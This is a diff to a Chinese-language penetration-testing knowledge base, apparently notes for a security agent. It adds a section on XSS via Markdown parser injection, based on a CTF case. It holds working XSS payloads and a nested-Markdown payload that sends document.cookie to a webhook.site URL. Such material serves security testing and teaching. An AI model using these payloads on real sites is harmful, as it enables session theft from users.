@@ -30,12 +30,55 @@
 - 属性内：`" onmouseover="alert(1)" `
 - JS 字符串内：`';alert(1);//`
 - URL 内：`javascript:alert(1)`
-- 绕过 CSP：找允许的 script src 域 / JSONP 端点 / base 标签劫持
+- **Markdown 解析器注入**（详见下文 1.1.1）
+- 绕过 CSP：详见 `$AGENT_DIR/knowledge-base/csp-bypass.md`
 
 **关键检查点**：
 - nonce 机制是否可预测/绕过？
 - 输入是否经过多个处理层？每一层可能引入不同的转义行为
 - 响应的 Content-Type 是否正确？（`text/html` 浏览器才解析）
+- 应用是否使用 Markdown 渲染？Markdown 解析器是否允许 HTML 混合或存在 URL 属性注入？
+
+#### 1.1.1 Markdown 解析器注入
+
+> 经验来源: SnailNet CTF。Markdown 解析器将用户输入转为 HTML，但某些解析器对嵌套结构处理不当，允许注入 HTML 属性。
+
+**场景**：应用允许用户提交 Markdown 内容并渲染为 HTML（论坛帖子、评论、个人简介等）。
+
+**为什么 Markdown 是 XSS 风险点**：
+1. Markdown 的设计目标就是**生成 HTML**，本质上是"用户输入 → HTML 转换器"
+2. 许多 Markdown 解析器支持 HTML 混合模式（Markdown 中直接写 HTML）
+3. 即使禁用了 HTML 混合，解析器对特殊语法的处理也可能有边界情况
+
+**常见注入方式**：
+
+| 注入方式 | Payload 示例 | 原理 |
+|---------|-------------|------|
+| HTML 混合模式 | `<img src=x onerror=alert(1)>` | 解析器直接透传 HTML 标签 |
+| 图片 alt 文本 | `![alt"><script>alert(1)</script>](url)` | alt 属性未转义 |
+| 链接 title | `[link](url "title"><script>alert(1)</script>)` | title 属性未转义 |
+| **URL 属性注入** | `![[x](url1)](url2 onerror=alert(1))` | 嵌套结构导致 URL 后的内容被解析为 HTML 属性 |
+
+**URL 属性注入详解**（SnailNet 案例）：
+
+```markdown
+![[x](https://webhook.site/?c=)](https://webhook.site//?dummy onerror=this.src=this.src+document.cookie x=)
+```
+
+解析器将这个嵌套结构渲染为：
+
+```html
+<img src="https://webhook.site//?dummy" onerror="this.src=this.src+document.cookie" x="">
+```
+
+`onerror` 属性被成功注入。当图片加载失败时，JavaScript 执行。
+
+**检查清单**：
+1. 确认应用是否使用 Markdown 渲染（查看页面源码，HTML 结构是否有 Markdown 解析器的特征）
+2. 测试 HTML 混合模式是否开启（提交 `<b>test</b>` 看是否渲染）
+3. 测试标准 Markdown 语法中的边界情况（alt text / title / URL 中的特殊字符）
+4. 测试嵌套/不标准的 Markdown 语法（解析器的边界处理通常是弱点）
+5. 确认渲染后的 HTML 是否存在 CSP 保护
 
 ### 1.2 SQL 注入
 
